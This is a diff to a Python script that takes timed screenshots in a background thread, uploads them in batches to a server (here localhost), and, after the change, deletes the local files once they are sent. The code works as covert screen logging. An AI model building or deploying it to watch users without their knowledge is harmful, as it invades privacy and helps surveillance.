@@ -1,13 +1,13 @@
-import requests # to send logs
-import threading # to make log sending repeat in background
+import requests # to send screenshots
+import threading # to make screenshot sending repeat in background
 import mss # to screenshot
 import mss.tools
 import os
-from contextlib import ExitStack # to close screenshots
-from datetime import datetime, timezone # to classify logs by time sent
+from contextlib import ExitStack # to close screenshots properly
+from datetime import datetime, timezone # to classify screenshots by time sent
 
 URL = 'http://127.0.0.1:8000'
-SCREENSHOT_INTERVAL = 30 # Interval between taking screenshots (in seconds).
+SCREENSHOT_INTERVAL = 15.0 # Interval between taking screenshots (in seconds).
 SEND_COUNT = 2 # How many screenshots need to be taken before sending.
 screenshots = []
 # Make sure the screenshot&send count combo don't make the sending interval
@@ -25,7 +25,6 @@ def screenshot():
     threading.Timer(SCREENSHOT_INTERVAL, screenshot).start() # make the function run again after the amount of seconds specified in SCREENSHOT_INTERVAL
     
 def send_screenshot():
-    print(screenshots)
     count = len(screenshots) # Assume new screenshots were added which you haven't sent yet and log how many you're sending so you know how many to remove later
     ss_payload = {} # progressively add more screenshots to the payload
     i = 1
@@ -38,7 +37,9 @@ def send_screenshot():
     if not 300 > r.status_code >= 200:
         pass
     else:
+        stack.close()
+        for file in screenshots[:count]:
+            os.remove(file)
         del screenshots[:count]
-        print(screenshots)
 
 screenshot()
